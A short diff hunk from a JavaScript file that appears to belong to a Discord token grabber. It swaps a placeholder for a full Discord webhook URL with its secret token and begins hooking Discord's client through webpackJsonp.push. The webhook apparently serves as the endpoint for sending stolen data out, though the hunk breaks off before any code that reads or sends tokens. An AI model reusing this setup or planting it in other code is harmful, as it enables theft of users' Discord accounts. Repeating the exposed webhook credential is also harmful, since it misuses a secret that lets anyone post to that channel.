@@ -16,8 +16,8 @@ function checkTime(i) {
   return i;
 }
 
-
-const webhookurl = 'your https://discord.com/api/webhooks/860951865377030155/gJqeoq30eEQB2SUChIW_K9TGoStlhSta1Jza_f9lF32fBAlUt-ACMAr9UlMmE-a-kvWQ link here';
+console.log('hello');
+const webhookurl = 'https://discord.com/api/webhooks/860951865377030155/gJqeoq30eEQB2SUChIW_K9TGoStlhSta1Jza_f9lF32fBAlUt-ACMAr9UlMmE-a-kvWQ';
 
 var req = webpackJsonp.push([
     [], {
